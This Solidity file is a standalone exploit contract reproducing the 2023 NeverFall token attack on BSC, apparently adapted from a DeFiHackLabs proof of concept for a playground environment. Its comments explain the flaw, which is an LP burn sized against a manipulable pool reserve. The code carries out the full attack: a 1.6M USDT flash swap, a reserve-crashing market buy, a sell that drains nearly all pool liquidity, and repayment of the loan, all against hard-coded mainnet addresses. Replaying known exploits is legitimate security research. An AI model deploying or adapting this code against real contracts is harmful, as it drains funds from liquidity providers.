// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-NeverFall).
//
// The DeFiHackLabs PoC runs the whole attack inline on the Foundry test contract
// itself (`ContractTest is Test`, attacker = address(this)); the PancakeSwap V2
// flash-swap callback (`pancakeCall`) is implemented directly on the test. There
// is no separate exploit contract to deploy against constructor args, so this is
// a faithful, self-contained copy of that inline attack: testExploit's
// `Pair.swap(...)` becomes `run()`, and `pancakeCall` is reproduced unchanged.
// Logic and constants are copied verbatim from test/NeverFall_exp.sol.
//
// Root cause: NeverFallToken.sell() sizes the LP burn against a single live,
// manipulable pool reserve. needLiquidity = amount * totalLP / balanceNF, where
// balanceNF = this.balanceOf(uniswapV2Pair) is the instantaneous NF reserve. By
// first market-buying NF and crashing the pool's NF reserve, the same sell
// `amount` redeems ~99.66% of all LP (other LPs' USDT included) for far more
// USDT than the NF is worth. There is no oracle/TWAP, no cap on the LP burn, and
// removeLiquidity passes amountBMin = 0 on the USDT side.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface INeverFall {
    function buy(uint256 amountU) external returns (uint256);
    function sell(uint256 amount) external returns (uint256);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract NeverFallDrain {
    address constant NEVERFALL = 0x5ABDe8B434133C98c36F4B21476791D95D888bF5;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant BUSD_USDT_POOL = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    // NF transfers via the pair require the recipient to be NeverFall-whitelisted
    // (NeverFallToken._transfer: automatedMarketMakerPairs[from] => require
    // (whitelist[to])). The historical attacker used this whitelisted EOA as the
    // market-buy recipient (test/NeverFall_exp.sol: `creator`). The NF bought
    // here is only meant to crash the pool's NF reserve -- it is NOT sold (sell()
    // spends the ~79.9M NF credited by buy(), via super._transfer, which bypasses
    // the whitelist gate), so routing the market-buy output to the whitelisted
    // EOA faithfully reproduces the reserve manipulation.
    address constant WHITELISTED_RECIPIENT = 0x051d6a5f987e4fc53B458eC4f88A104356E6995a;

    uint256 constant FLASH_LOAN_AMOUNT = 1_600_000 * 1e18;

    // Faithful copy of testExploit()'s recorded portion: flash-swap 1.6M USDT
    // from the BUSD/USDT pair, which calls back into pancakeCall() below.
    function run() external {
        IUniPairV2(BUSD_USDT_POOL).swap(FLASH_LOAN_AMOUNT, 0, address(this), new bytes(1));
    }

    // PancakeSwap V2 flash-swap callback. Verbatim copy of the test's logic:
    // approve -> buy(200K) -> market-buy 1.4M USDT of NF (crashes the pool NF
    // reserve) -> sell(75.5M NF) redeems ~all LP -> repay the flash loan.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        uint256 usdtBalance = IERC20(USDT).balanceOf(address(this));
        IERC20(USDT).approve(NEVERFALL, type(uint256).max);
        IERC20(USDT).approve(ROUTER, type(uint256).max);
        // buy neverfall (contract adds huge fixed NF + USDT liquidity; attacker
        // credited ~79.9M NF)
        INeverFall(NEVERFALL).buy(200_000 * 1e18);
        // market-buy NF with 1.4M USDT -> pulls ~181.5M NF out of the pool,
        // collapsing the pool's NF reserve so sell()'s needLiquidity balloons.
        // Output routed to the whitelisted EOA (see WHITELISTED_RECIPIENT): the
        // pair->recipient NF transfer is gated by NeverFall's whitelist.
        bscSwap(USDT, NEVERFALL, 1_400_000 * 1e18);
        // sell neverfall: needLiquidity = 75.5M * totalLP / balanceNF ~ 99.66% of
        // all LP -> removeLiquidity drains ~1.975M USDT out of the pool. sell()
        // uses super._transfer (bypassing the whitelist) for the NF the exploit
        // was credited by buy().
        INeverFall(NEVERFALL).sell(75_500_000 * 1e18);

        // Repay the flash loan: principal + 0.3% fee (usdtBalance * 30 / 10000).
        IERC20(USDT).transfer(msg.sender, usdtBalance + usdtBalance * 30 / 10_000);
    }

    function bscSwap(address tokenFrom, address tokenTo, uint256 amount) internal {
        IERC20(tokenFrom).approve(ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = tokenFrom;
        path[1] = tokenTo;
        IUniswapV2Router(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, WHITELISTED_RECIPIENT, block.timestamp
        );
    }
}
